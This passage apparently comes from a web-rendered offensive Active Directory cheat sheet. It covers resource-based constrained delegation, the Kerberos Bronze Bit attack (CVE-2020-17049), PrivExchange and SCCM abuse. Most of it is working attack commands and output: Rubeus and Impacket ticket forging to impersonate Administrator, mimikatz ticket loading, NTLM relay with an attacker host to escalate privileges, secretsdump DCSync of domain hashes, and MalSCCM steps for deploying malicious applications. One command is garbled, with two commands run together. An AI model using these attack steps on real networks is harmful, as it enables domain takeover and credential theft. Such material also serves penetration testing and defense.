<a id="__codelineno-291-7" name="__codelineno-291-7" href="#__codelineno-291-7"></a><span class="nv">$Descriptor</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="nv">$RawBytes</span><span class="p">,</span> <span class="n">0</span>
<a id="__codelineno-291-8" name="__codelineno-291-8" href="#__codelineno-291-8"></a><span class="nv">$Descriptor</span><span class="p">.</span><span class="n">DiscretionaryAcl</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-292-1" name="__codelineno-292-1" href="#__codelineno-292-1"></a><span class="c"># alternative</span>
<a id="__codelineno-292-2" name="__codelineno-292-2" href="#__codelineno-292-2"></a><span class="nv">$SID_FROM_PREVIOUS_COMMAND</span> <span class="p">=</span> <span class="nb">Get-DomainComputer</span> <span class="n">MACHINE_ACCOUNT_NAME</span> <span class="n">-Properties</span> <span class="n">objectsid</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-Expand</span> <span class="n">objectsid</span>
<a id="__codelineno-292-3" name="__codelineno-292-3" href="#__codelineno-292-3"></a><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)&quot;</span><span class="p">;</span> <span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">);</span> <span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">);</span> <span class="nb">Get-DomainComputer</span> <span class="n">DC01</span> <span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span>
<a id="__codelineno-292-4" name="__codelineno-292-4" href="#__codelineno-292-4"></a>
<a id="__codelineno-292-5" name="__codelineno-292-5" href="#__codelineno-292-5"></a><span class="c"># alternative</span>
<a id="__codelineno-292-6" name="__codelineno-292-6" href="#__codelineno-292-6"></a><span class="n">StandIn_Net35</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-computer</span> <span class="n">dc01</span> <span class="p">-</span><span class="n">-sid</span> <span class="n">SID_FROM_PREVIOUS_COMMAND</span>
</code></pre></div>
</li>
<li>
<p>Use Rubeus to get hash from password</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-293-1" name="__codelineno-293-1" href="#__codelineno-293-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s1">&#39;Weakest123*&#39;</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">swktest</span><span class="p">$</span>  <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">factory</span><span class="p">.</span><span class="n">lan</span>
<a id="__codelineno-293-2" name="__codelineno-293-2" href="#__codelineno-293-2"></a><span class="p">[*]</span> <span class="n">Input</span> <span class="n">password</span>             <span class="p">:</span> <span class="n">Weakest123</span><span class="p">*</span>
<a id="__codelineno-293-3" name="__codelineno-293-3" href="#__codelineno-293-3"></a><span class="p">[*]</span> <span class="n">Input</span> <span class="n">username</span>             <span class="p">:</span> <span class="n">swktest</span><span class="p">$</span>
<a id="__codelineno-293-4" name="__codelineno-293-4" href="#__codelineno-293-4"></a><span class="p">[*]</span> <span class="n">Input</span> <span class="n">domain</span>               <span class="p">:</span> <span class="n">factory</span><span class="p">.</span><span class="n">lan</span>
<a id="__codelineno-293-5" name="__codelineno-293-5" href="#__codelineno-293-5"></a><span class="p">[*]</span> <span class="n">Salt</span>                       <span class="p">:</span> <span class="n">FACTORY</span><span class="p">.</span><span class="n">LANswktest</span>
<a id="__codelineno-293-6" name="__codelineno-293-6" href="#__codelineno-293-6"></a><span class="p">[*]</span>       <span class="n">rc4_hmac</span>             <span class="p">:</span> <span class="n">F8E064CA98539B735600714A1F1907DD</span>
<a id="__codelineno-293-7" name="__codelineno-293-7" href="#__codelineno-293-7"></a><span class="p">[*]</span>       <span class="n">aes128_cts_hmac_sha1</span> <span class="p">:</span> <span class="n">D45DEADECB703CFE3774F2AA20DB9498</span>
<a id="__codelineno-293-8" name="__codelineno-293-8" href="#__codelineno-293-8"></a><span class="p">[*]</span>       <span class="n">aes256_cts_hmac_sha1</span> <span class="p">:</span> <span class="n">0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347</span>
<a id="__codelineno-293-9" name="__codelineno-293-9" href="#__codelineno-293-9"></a><span class="p">[*]</span>       <span class="n">des_cbc_md5</span>          <span class="p">:</span> <span class="n">BA297CFD07E62A5E</span>
</code></pre></div>
</li>
<li>
<p>Impersonate domain admin using our newly created machine account</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-294-1" name="__codelineno-294-1" href="#__codelineno-294-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">swktest</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">F8E064CA98539B735600714A1F1907DD</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">dc01-ww2</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="n">lan</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:</span><span class="n">cifs</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">rpcss</span><span class="p">,</span><span class="n">wsman</span><span class="p">,</span><span class="n">ldap</span>
<a id="__codelineno-294-2" name="__codelineno-294-2" href="#__codelineno-294-2"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">swktest</span><span class="p">$</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">dc01-ww2</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="n">lan</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:</span><span class="n">cifs</span><span class="p">,</span><span class="n">http</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">rpcss</span><span class="p">,</span><span class="n">wsman</span><span class="p">,</span><span class="n">ldap</span>
<a id="__codelineno-294-3" name="__codelineno-294-3" href="#__codelineno-294-3"></a>
<a id="__codelineno-294-4" name="__codelineno-294-4" href="#__codelineno-294-4"></a><span class="p">[*]</span> <span class="n">Impersonating</span> <span class="n">user</span> <span class="s1">&#39;Administrator&#39;</span> <span class="n">to</span> <span class="n">target</span> <span class="n">SPN</span> <span class="s1">&#39;cifs/dc01-ww2.factory.lan&#39;</span>
<a id="__codelineno-294-5" name="__codelineno-294-5" href="#__codelineno-294-5"></a><span class="p">[*]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">DC01-WW2</span><span class="p">.</span><span class="n">factory</span><span class="p">.</span><span class="n">lan</span> <span class="p">(</span><span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">42</span><span class="p">.</span><span class="n">5</span><span class="p">)</span>
<a id="__codelineno-294-6" name="__codelineno-294-6" href="#__codelineno-294-6"></a><span class="p">[*]</span> <span class="n">Building</span> <span class="n">S4U2proxy</span> <span class="n">request</span> <span class="k">for</span> <span class="n">service</span><span class="p">:</span> <span class="s1">&#39;cifs/dc01-ww2.factory.lan&#39;</span>
<a id="__codelineno-294-7" name="__codelineno-294-7" href="#__codelineno-294-7"></a><span class="p">[*]</span> <span class="n">Sending</span> <span class="n">S4U2proxy</span> <span class="n">request</span>
<a id="__codelineno-294-8" name="__codelineno-294-8" href="#__codelineno-294-8"></a><span class="p">[+]</span> <span class="n">S4U2proxy</span> <span class="n">success</span><span class="p">!</span>
<a id="__codelineno-294-9" name="__codelineno-294-9" href="#__codelineno-294-9"></a><span class="p">[*]</span> <span class="n">base64</span><span class="p">(</span><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span><span class="p">)</span> <span class="k">for</span> <span class="n">SPN</span> <span class="s1">&#39;cifs/dc01-ww2.factory.lan&#39;</span><span class="p">:</span>
<a id="__codelineno-294-10" name="__codelineno-294-10" href="#__codelineno-294-10"></a>
<a id="__codelineno-294-11" name="__codelineno-294-11" href="#__codelineno-294-11"></a>    <span class="n">doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD</span>
<a id="__codelineno-294-12" name="__codelineno-294-12" href="#__codelineno-294-12"></a>    <span class="n">AgECoR4wHBsEY2lmcxsUZGMwMS</span><span class="p">[...]</span><span class="n">PMIIFC6ADAgESoQMCAQOiggT9BIIE</span>
<a id="__codelineno-294-13" name="__codelineno-294-13" href="#__codelineno-294-13"></a>    <span class="n">LmZhY3RvcnkubGFu</span>
<a id="__codelineno-294-14" name="__codelineno-294-14" href="#__codelineno-294-14"></a>
<a id="__codelineno-294-15" name="__codelineno-294-15" href="#__codelineno-294-15"></a><span class="p">[*]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Import</span> <span class="n">Ticket</span>
<a id="__codelineno-294-16" name="__codelineno-294-16" href="#__codelineno-294-16"></a><span class="p">[+]</span> <span class="n">Ticket</span> <span class="n">successfully</span> <span class="n">imported</span><span class="p">!</span>
</code></pre></div>
</li>
</ol>
<h2 id="kerberos-bronze-bit-attack-cve-2020-17049">Kerberos Bronze Bit Attack - CVE-2020-17049</h2>
<blockquote>
<p>An attacker can impersonate users which are not allowed to be delegated. This includes members of the <strong>Protected Users</strong> group and any other users explicitly configured as <strong>sensitive and cannot be delegated</strong>.</p>
<p>Patch is out on November 10, 2020, DC are most likely vulnerable until <a href="https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049">February 2021</a>.</p>
</blockquote>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Patched Error Message : <code>[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)</code></p>
<p>Requirements:
* Service account's password hash 
* Service account's with <code>Constrained Delegation</code> or <code>Resource Based Constrained Delegation</code>
* <a href="https://github.com/SecureAuthCorp/impacket/pull/1013">Impacket PR #1013</a> </p>
<p><strong>Attack #1</strong> - Bypass the <code>Trust this user for delegation to specified services only – Use Kerberos only</code> protection and impersonate a user who is protected from delegation.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-295-1" name="__codelineno-295-1" href="#__codelineno-295-1"></a><span class="c"># forwardable flag is only protected by the ticket encryption which uses the service account&#39;s password </span>
<a id="__codelineno-295-2" name="__codelineno-295-2" href="#__codelineno-295-2"></a><span class="p">$</span> <span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">Service2</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">Administrator</span> <span class="n">-hashes</span> <span class="p">&lt;</span><span class="n">LM</span><span class="p">:</span><span class="n">NTLM</span> <span class="n">hash</span><span class="p">&gt;</span> <span class="n">-aesKey</span> <span class="p">&lt;</span><span class="n">AES</span> <span class="n">hash</span><span class="p">&gt;</span> <span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">Service1</span> <span class="n">-force-forwardable</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">Domain</span> <span class="n">controller</span><span class="p">&gt;</span> <span class="c"># -&gt; Forwardable</span>
<a id="__codelineno-295-3" name="__codelineno-295-3" href="#__codelineno-295-3"></a>
<a id="__codelineno-295-4" name="__codelineno-295-4" href="#__codelineno-295-4"></a><span class="p">$</span> <span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">Service2</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">User2</span> <span class="n">-hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">7c1673f58e7794c77dead3174b58b68f</span> <span class="n">-aesKey</span> <span class="n">4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4</span> <span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">Service1</span> <span class="n">-force-forwardable</span>
<a id="__codelineno-295-5" name="__codelineno-295-5" href="#__codelineno-295-5"></a>
<a id="__codelineno-295-6" name="__codelineno-295-6" href="#__codelineno-295-6"></a><span class="c"># Load the ticket</span>
<a id="__codelineno-295-7" name="__codelineno-295-7" href="#__codelineno-295-7"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;kerberos::ptc User2.ccache&quot;</span> <span class="n">exit</span>
<a id="__codelineno-295-8" name="__codelineno-295-8" href="#__codelineno-295-8"></a>
<a id="__codelineno-295-9" name="__codelineno-295-9" href="#__codelineno-295-9"></a><span class="c"># Access &quot;c$&quot;</span>
<a id="__codelineno-295-10" name="__codelineno-295-10" href="#__codelineno-295-10"></a><span class="nb">ls </span><span class="p">\\</span><span class="n">service2</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
</code></pre></div>
<p><strong>Attack #2</strong> - Write Permissions to one or more objects in the AD</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-296-1" name="__codelineno-296-1" href="#__codelineno-296-1"></a><span class="c"># Create a new machine account</span>
<a id="__codelineno-296-2" name="__codelineno-296-2" href="#__codelineno-296-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">\</span><span class="n">powermad</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-296-3" name="__codelineno-296-3" href="#__codelineno-296-3"></a><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">AttackerService</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;AttackerServicePassword&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
<a id="__codelineno-296-4" name="__codelineno-296-4" href="#__codelineno-296-4"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local&quot;</span> <span class="n">exit</span>
<a id="__codelineno-296-5" name="__codelineno-296-5" href="#__codelineno-296-5"></a>
<a id="__codelineno-296-6" name="__codelineno-296-6" href="#__codelineno-296-6"></a><span class="c"># Set PrincipalsAllowedToDelegateToAccount</span>
<a id="__codelineno-296-7" name="__codelineno-296-7" href="#__codelineno-296-7"></a><span class="nb">Install-WindowsFeature</span> <span class="n">RSAT-AD-PowerShell</span>
<a id="__codelineno-296-8" name="__codelineno-296-8" href="#__codelineno-296-8"></a><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span>
<a id="__codelineno-296-9" name="__codelineno-296-9" href="#__codelineno-296-9"></a><span class="nb">Get-ADComputer</span> <span class="n">AttackerService</span>
<a id="__codelineno-296-10" name="__codelineno-296-10" href="#__codelineno-296-10"></a><span class="nb">Set-ADComputer</span> <span class="n">Service2</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="n">AttackerService</span><span class="p">$</span>
<a id="__codelineno-296-11" name="__codelineno-296-11" href="#__codelineno-296-11"></a><span class="nb">Get-ADComputer</span> <span class="n">Service2</span> <span class="n">-Properties</span> <span class="n">PrincipalsAllowedToDelegateToAccount</span>
<a id="__codelineno-296-12" name="__codelineno-296-12" href="#__codelineno-296-12"></a>
<a id="__codelineno-296-13" name="__codelineno-296-13" href="#__codelineno-296-13"></a><span class="c"># Execute the attack</span>
<a id="__codelineno-296-14" name="__codelineno-296-14" href="#__codelineno-296-14"></a><span class="n">python</span> <span class="p">.\</span><span class="n">impacket</span><span class="p">\</span><span class="n">examples</span><span class="p">\</span><span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">Service2</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">User2</span> <span class="n">-hashes</span> <span class="n">830f8df592f48bc036ac79a2bb8036c5</span><span class="p">:</span><span class="n">830f8df592f48bc036ac79a2bb8036c5</span> <span class="n">-aesKey</span> <span class="n">2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc</span> <span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">AttackerService</span> <span class="n">-force-forwardableet-ADComputer</span> <span class="n">Service2</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="n">AttackerService</span><span class="p">$</span>
<a id="__codelineno-296-15" name="__codelineno-296-15" href="#__codelineno-296-15"></a>
<a id="__codelineno-296-16" name="__codelineno-296-16" href="#__codelineno-296-16"></a><span class="c"># Load the ticket</span>
<a id="__codelineno-296-17" name="__codelineno-296-17" href="#__codelineno-296-17"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;kerberos::ptc User2.ccache&quot;</span> <span class="n">exit</span> <span class="p">|</span> <span class="nb">Out-Null</span>
</code></pre></div>
<h2 id="privexchange-attack">PrivExchange attack</h2>
<p>Exchange your privileges for Domain Admin privs by abusing Exchange.  <br />
<img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> You need a shell on a user account with a mailbox.</p>
<ol>
<li>
<p>Exchange server hostname or IP address</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-297-1" name="__codelineno-297-1" href="#__codelineno-297-1"></a>pth-net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>members<span class="w"> </span><span class="s2">&quot;Exchange Servers&quot;</span><span class="w"> </span>-I<span class="w"> </span>dc01.domain.local<span class="w"> </span>-U<span class="w"> </span>domain/username
</code></pre></div>
</li>
<li>
<p>Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-298-1" name="__codelineno-298-1" href="#__codelineno-298-1"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">ldap</span><span class="p">://</span><span class="n">dc01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-escalate-user</span> <span class="n">username</span>
</code></pre></div>
</li>
<li>
<p>Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-299-1" name="__codelineno-299-1" href="#__codelineno-299-1"></a><span class="c1"># https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py</span>
<a id="__codelineno-299-2" name="__codelineno-299-2" href="#__codelineno-299-2"></a>python<span class="w"> </span>privexchange.py<span class="w"> </span>-ah<span class="w"> </span>xxxxxxx<span class="w"> </span>-u<span class="w"> </span>xxxx<span class="w"> </span>-d<span class="w"> </span>xxxxx
<a id="__codelineno-299-3" name="__codelineno-299-3" href="#__codelineno-299-3"></a>python<span class="w"> </span>privexchange.py<span class="w"> </span>-ah<span class="w"> </span><span class="m">10</span>.0.0.2<span class="w"> </span>mail01.domain.local<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-u<span class="w"> </span>user_exchange<span class="w"> </span>-p<span class="w"> </span>pass_exchange
<a id="__codelineno-299-4" name="__codelineno-299-4" href="#__codelineno-299-4"></a>
<a id="__codelineno-299-5" name="__codelineno-299-5" href="#__codelineno-299-5"></a><span class="c1"># https://github.com/G0ldenGunSec/PowerPriv </span>
<a id="__codelineno-299-6" name="__codelineno-299-6" href="#__codelineno-299-6"></a>powerPriv<span class="w"> </span>-targetHost<span class="w"> </span>corpExch01<span class="w"> </span>-attackerHost<span class="w"> </span><span class="m">192</span>.168.1.17<span class="w"> </span>-Version<span class="w"> </span><span class="m">2016</span>
</code></pre></div>
</li>
<li>
<p>Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-300-1" name="__codelineno-300-1" href="#__codelineno-300-1"></a>python<span class="w"> </span>secretsdump.py<span class="w"> </span>xxxxxxxxxx<span class="w"> </span>-just-dc
<a id="__codelineno-300-2" name="__codelineno-300-2" href="#__codelineno-300-2"></a>python<span class="w"> </span>secretsdump.py<span class="w"> </span>lab/buff@192.168.0.2<span class="w"> </span>-ntds<span class="w"> </span>ntds<span class="w"> </span>-history<span class="w"> </span>-just-dc-ntlm
</code></pre></div>
</li>
<li>
<p>Clean your mess and restore a previous state of the user's ACL</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-301-1" name="__codelineno-301-1" href="#__codelineno-301-1"></a><span class="n">python</span> <span class="n">aclpwn</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-restore</span> <span class="p">../</span><span class="n">aclpwn</span><span class="p">-</span><span class="n">20190319</span><span class="p">-</span><span class="n">125741</span><span class="p">.</span><span class="n">restore</span>
</code></pre></div>
</li>
</ol>
<p>Alternatively you can use the Metasploit module </p>
<p><a href="https://github.com/rapid7/metasploit-framework/pull/11420"><code>use auxiliary/scanner/http/exchange_web_server_pushsubscription</code></a></p>
<p>Alternatively you can use an all-in-one tool : Exchange2domain.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-302-1" name="__codelineno-302-1" href="#__codelineno-302-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">Ridter</span><span class="p">/</span><span class="n">Exchange2domain</span> 
<a id="__codelineno-302-2" name="__codelineno-302-2" href="#__codelineno-302-2"></a><span class="n">python</span> <span class="n">Exchange2domain</span><span class="p">.</span><span class="n">py</span> <span class="n">-ah</span> <span class="n">attackterip</span> <span class="n">-ap</span> <span class="n">listenport</span> <span class="n">-u</span> <span class="n">user</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">com</span> <span class="n">-th</span> <span class="n">DCip</span> <span class="n">MailServerip</span>
<a id="__codelineno-302-3" name="__codelineno-302-3" href="#__codelineno-302-3"></a><span class="n">python</span> <span class="n">Exchange2domain</span><span class="p">.</span><span class="n">py</span> <span class="n">-ah</span> <span class="n">attackterip</span> <span class="n">-u</span> <span class="n">user</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-d</span> <span class="n">domain</span><span class="p">.</span><span class="n">com</span> <span class="n">-th</span> <span class="n">DCip</span> <span class="p">-</span><span class="n">-just-dc-user</span> <span class="n">krbtgt</span> <span class="n">MailServerip</span>
</code></pre></div>
<h2 id="sccm-deployment">SCCM Deployment</h2>
<blockquote>
<p>SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.</p>
</blockquote>
<ul>
<li><a href="https://github.com/PowerShellMafia/PowerSCCM">PowerSCCM - PowerShell module to interact with SCCM deployments</a></li>
<li>
<p><a href="https://github.com/nettitude/MalSCCM">MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage</a></p>
</li>
<li>
<p>Using <strong>SharpSCCM</strong>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-303-1" name="__codelineno-303-1" href="#__codelineno-303-1"></a><span class="p">.\</span><span class="n">SharpSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">get</span> <span class="n">device</span> <span class="p">-</span><span class="n">-server</span> <span class="p">&lt;</span><span class="n">SERVER8NAME</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-site-code</span> <span class="p">&lt;</span><span class="n">SITE_CODE</span><span class="p">&gt;</span>
<a id="__codelineno-303-2" name="__codelineno-303-2" href="#__codelineno-303-2"></a><span class="p">.\</span><span class="n">SharpSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="p">&lt;</span><span class="n">server</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">sitecode</span><span class="p">&gt;</span> <span class="n">exec</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">device_name</span><span class="p">&gt;</span> <span class="n">-r</span> <span class="p">&lt;</span><span class="n">relay_server_ip</span><span class="p">&gt;</span>
<a id="__codelineno-303-3" name="__codelineno-303-3" href="#__codelineno-303-3"></a><span class="p">.\</span><span class="n">SharpSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">exec</span> <span class="n">-d</span> <span class="n">WS01</span> <span class="n">-p</span> <span class="s2">&quot;C:\Windows\System32\ping 10.10.10.10&quot;</span> <span class="n">-s</span> <span class="p">-</span><span class="n">-debug</span>
</code></pre></div></p>
</li>
<li>Compromise client, use locate to find management server 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-304-1" name="__codelineno-304-1" href="#__codelineno-304-1"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">locate</span>
</code></pre></div></li>
<li>Enumerate over WMI as an administrator of the Distribution Point
    <div class="highlight"><pre><span></span><code><a id="__codelineno-305-1" name="__codelineno-305-1" href="#__codelineno-305-1"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">inspect</span> <span class="p">/</span><span class="n">server</span><span class="p">:&lt;</span><span class="n">DistributionPoint</span> <span class="n">Server</span> <span class="n">FQDN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">groups</span>
</code></pre></div></li>
<li>Compromise management server, use locate to find primary server</li>
<li>Use <code>inspect</code> on primary server to view who you can target
    <div class="highlight"><pre><span></span><code><a id="__codelineno-306-1" name="__codelineno-306-1" href="#__codelineno-306-1"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">inspect</span> <span class="p">/</span><span class="n">all</span>
<a id="__codelineno-306-2" name="__codelineno-306-2" href="#__codelineno-306-2"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">inspect</span> <span class="p">/</span><span class="n">computers</span>
<a id="__codelineno-306-3" name="__codelineno-306-3" href="#__codelineno-306-3"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">inspect</span> <span class="p">/</span><span class="n">primaryusers</span>
<a id="__codelineno-306-4" name="__codelineno-306-4" href="#__codelineno-306-4"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">inspect</span> <span class="p">/</span><span class="n">groups</span>
</code></pre></div></li>
<li>
<p>Create a new device group for the machines you want to laterally move too
    <div class="highlight"><pre><span></span><code><a id="__codelineno-307-1" name="__codelineno-307-1" href="#__codelineno-307-1"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="nb">group </span><span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">groupname</span><span class="p">:</span><span class="n">TargetGroup</span> <span class="p">/</span><span class="n">grouptype</span><span class="p">:</span><span class="n">device</span>
<a id="__codelineno-307-2" name="__codelineno-307-2" href="#__codelineno-307-2"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">inspect</span> <span class="p">/</span><span class="n">groups</span>
</code></pre></div></p>
</li>
<li>
<p>Add your targets into the new group 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-308-1" name="__codelineno-308-1" href="#__codelineno-308-1"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="nb">group </span><span class="p">/</span><span class="n">addhost</span> <span class="p">/</span><span class="n">groupname</span><span class="p">:</span><span class="n">TargetGroup</span> <span class="p">/</span><span class="n">host</span><span class="p">:</span><span class="n">WIN2016-SQL</span>
</code></pre></div></p>
</li>
<li>
<p>Create an application pointing to a malicious EXE on a world readable share : <code>SCCMContentLib$</code>
